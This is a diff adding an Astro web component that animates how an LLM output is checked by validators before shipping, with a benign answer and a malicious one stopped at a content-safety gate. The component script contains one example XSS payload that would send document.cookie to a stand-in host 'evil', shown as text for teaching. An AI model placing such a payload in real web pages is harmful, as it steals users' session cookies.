@@ -1,0 +1,231 @@
+---
+import { Icon } from 'astro-icon/components'
+
+// Pattern 2 made tangible: an LLM output runs through deterministic validators
+// before it ships. Toggle a benign answer vs a malicious (Lenovo-style XSS)
+// output — the malicious one is blocked at the content-safety gate.
+const gates = [
+  { key: 'claims', label: 'Claims vs facts', icon: 'material-symbols:fact-check' },
+  { key: 'commit', label: 'Commitment', icon: 'material-symbols:gavel' },
+  { key: 'tone', label: 'Tone', icon: 'material-symbols:sentiment-satisfied' },
+  { key: 'safety', label: 'Content safety', icon: 'material-symbols:shield' },
+]
+---
+
+<div
+  class="not-prose my-10 border border-border-dark bg-surface rounded-lg overflow-hidden"
+  data-vp
+>
+  <div class="flex items-center justify-between gap-4 px-5 py-3 bg-surface-container-high border-b border-border-dark flex-wrap">
+    <span class="font-mono text-mono-xs text-primary uppercase tracking-widest flex items-center gap-2">
+      <Icon name="material-symbols:security" class="text-[16px]" />
+      Defense in depth: validate before ship
+    </span>
+    <div class="flex items-center gap-1 border border-border-dark p-0.5">
+      <button type="button" data-vp-mode="benign" class="vp-tab vp-tab-on" aria-pressed="true">Benign</button>
+      <button type="button" data-vp-mode="malicious" class="vp-tab" aria-pressed="false">Malicious (XSS)</button>
+    </div>
+  </div>
+
+  <div class="p-5">
+    <!-- the payload under test -->
+    <div class="mb-5 font-mono text-mono-xs">
+      <span class="text-text-muted uppercase tracking-wider">LLM output</span>
+      <code class="block mt-1 px-3 py-2 bg-code-bg border border-border-dark text-on-surface-variant overflow-x-auto" data-vp-payload
+        >Refund window is 30 days from purchase.</code
+      >
+    </div>
+
+    <!-- gates: a left-to-right pipeline. Stays horizontal on mobile (scrolls if
+         narrow) so the defense-in-depth sequence and the beam below keep mapping
+         to gate order, instead of collapsing into a row-by-row grid. -->
+    <div class="flex gap-2 items-stretch overflow-x-auto">
+      {
+        gates.map((g) => (
+          <div class="vp-gate flex flex-1 min-w-[4.5rem] flex-col items-center justify-center gap-1 text-center px-2 py-3 border border-border-dark bg-surface-container-low" data-vp-gate={g.key}>
+            <Icon name={g.icon} class="vp-gate-icon text-text-muted text-[20px]" />
+            <span class="font-mono text-mono-xs text-text-muted leading-tight">{g.label}</span>
+            <span class="vp-gate-mark font-mono text-mono-xs" aria-hidden="true"></span>
+          </div>
+        ))
+      }
+      <div class="vp-exit flex flex-1 min-w-[4.5rem] flex-col items-center justify-center gap-1 text-center px-2 py-3 border border-dashed border-border-dark" data-vp-exit>
+        <Icon name="material-symbols:rocket-launch" class="text-text-muted text-[20px]" />
+        <span class="font-mono text-mono-xs text-text-muted leading-tight">Ships</span>
+      </div>
+    </div>
+
+    <!-- beam -->
+    <div class="mt-3 h-1 bg-surface-container-low border border-border-dark overflow-hidden">
+      <div class="vp-beam h-full" data-vp-beam></div>
+    </div>
+
+    <p class="vp-status m-0 mt-4 flex items-center gap-2 px-3 py-2 border font-mono text-mono-xs" data-vp-status aria-live="polite">
+      <span data-vp-status-text>Toggle a payload to run the validators.</span>
+    </p>
+  </div>
+</div>
+
+<style is:global>
+  [data-vp] .vp-tab {
+    display: inline-flex;
+    align-items: center;
+    min-height: 2.75rem;
+    font-family: var(--font-mono);
+    font-size: 0.75rem;
+    color: var(--color-text-muted);
+    padding: 0.2rem 0.8rem;
+    transition: all 0.2s ease;
+  }
+  [data-vp] .vp-tab-on {
+    background: var(--color-primary);
+    color: var(--color-on-primary);
+  }
+  [data-vp] .vp-tab:focus-visible {
+    outline: 2px solid var(--color-primary);
+    outline-offset: 2px;
+  }
+  [data-vp] .vp-beam {
+    width: 100%;
+    transform: scaleX(0);
+    transform-origin: left;
+    /* Solid green: the beam tracks the payload clearing each validator (a safe
+       state). No two-hue meter gradient. */
+    background: var(--color-primary);
+  }
+  @media (prefers-reduced-motion: no-preference) {
+    [data-vp].is-interactive .vp-beam {
+      transition: transform 1.6s linear;
+    }
+  }
+  [data-vp] .vp-gate {
+    transition: border-color 0.25s ease, background-color 0.25s ease;
+  }
+  [data-vp] .vp-gate.pass {
+    border-color: color-mix(in srgb, var(--color-success) 50%, transparent);
+    background-color: color-mix(in srgb, var(--color-success) 8%, transparent);
+  }
+  [data-vp] .vp-gate.pass .vp-gate-icon,
+  [data-vp] .vp-gate.pass .vp-gate-mark {
+    color: var(--color-success);
+  }
+  [data-vp] .vp-gate.block {
+    border-color: var(--color-error);
+    background-color: color-mix(in srgb, var(--color-error) 10%, transparent);
+  }
+  [data-vp] .vp-gate.block .vp-gate-icon,
+  [data-vp] .vp-gate.block .vp-gate-mark {
+    color: var(--color-error);
+  }
+  @media (prefers-reduced-motion: no-preference) {
+    [data-vp] .vp-gate.block {
+      animation: vpShake 0.4s ease;
+    }
+  }
+  @keyframes vpShake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-3px); }
+    75% { transform: translateX(3px); }
+  }
+  [data-vp] .vp-exit.ship {
+    border-style: solid;
+    border-color: color-mix(in srgb, var(--color-success) 50%, transparent);
+    background-color: color-mix(in srgb, var(--color-success) 8%, transparent);
+  }
+  [data-vp] .vp-exit.ship svg,
+  [data-vp] .vp-exit.ship span {
+    color: var(--color-success);
+  }
+</style>
+
+<script>
+  const root = document.querySelector<HTMLElement>('[data-vp]')
+  if (root) {
+    root.classList.add('is-interactive')
+    const gates = [...root.querySelectorAll<HTMLElement>('[data-vp-gate]')]
+    const exit = root.querySelector<HTMLElement>('[data-vp-exit]')!
+    const beam = root.querySelector<HTMLElement>('[data-vp-beam]')!
+    const payload = root.querySelector<HTMLElement>('[data-vp-payload]')!
+    const status = root.querySelector<HTMLElement>('[data-vp-status]')!
+    const statusText = root.querySelector<HTMLElement>('[data-vp-status-text]')!
+    const tabs = [...root.querySelectorAll<HTMLButtonElement>('[data-vp-mode]')]
+    const reduce = matchMedia('(prefers-reduced-motion: reduce)').matches
+
+    const BENIGN = 'Refund window is 30 days from purchase.'
+    const EVIL = '<img src=x onerror="fetch(\'//evil/?c=\'+document.cookie)">'
+    let token = 0
+
+    const clear = () => {
+      gates.forEach((g) => g.classList.remove('pass', 'block'))
+      exit.classList.remove('ship')
+      status.className =
+        'vp-status m-0 mt-4 flex items-center gap-2 px-3 py-2 border font-mono text-mono-xs border-border-dark text-text-muted'
+    }
+
+    const run = (mode: string) => {
+      const myToken = ++token
+      clear()
+      payload.textContent = mode === 'malicious' ? EVIL : BENIGN
+      const blockAt = mode === 'malicious' ? 3 : -1 // content-safety gate index
+      const reachPct = blockAt === -1 ? 100 : ((blockAt + 1) / (gates.length + 1)) * 100
+      beam.style.transform = 'scaleX(0)'
+      // next frame so the transition runs
+      requestAnimationFrame(() => (beam.style.transform = `scaleX(${reachPct / 100})`))
+
+      const stepMs = reduce ? 0 : 320
+      gates.forEach((g, i) => {
+        window.setTimeout(() => {
+          if (myToken !== token) return
+          if (i === blockAt) {
+            g.classList.add('block')
+            g.querySelector('.vp-gate-mark')!.textContent = '✗'
+            status.classList.add('border-error', 'text-error')
+            statusText.textContent =
+              'BLOCKED at content safety. HTML/script stripped before render; the Lenovo XSS never ships.'
+          } else if (blockAt === -1 || i < blockAt) {
+            g.classList.add('pass')
+            g.querySelector('.vp-gate-mark')!.textContent = '✓'
+          }
+        }, stepMs * (i + 1))
+      })
+
+      if (blockAt === -1) {
+        window.setTimeout(
+          () => {
+            if (myToken !== token) return
+            exit.classList.add('ship')
+            status.classList.add('border-success')
+            statusText.textContent = 'All validators passed. Safe to ship.'
+          },
+          stepMs * (gates.length + 1),
+        )
+      }
+    }
+
+    tabs.forEach((tab) =>
+      tab.addEventListener('click', () => {
+        tabs.forEach((t) => {
+          t.classList.remove('vp-tab-on')
+          t.setAttribute('aria-pressed', 'false')
+        })
+        tab.classList.add('vp-tab-on')
+        tab.setAttribute('aria-pressed', 'true')
+        run(tab.dataset.vpMode!)
+      }),
+    )
+
+    // auto-run the malicious case once it scrolls into view
+    const io = new IntersectionObserver(
+      (entries, obs) => {
+        for (const e of entries) {
+          if (e.isIntersecting) {
+            obs.disconnect()
+            tabs.find((t) => t.dataset.vpMode === 'malicious')?.click()
+          }
+        }
+      },
+      { threshold: 0.4 },
+    )
+    io.observe(root)
+  }
+</script>
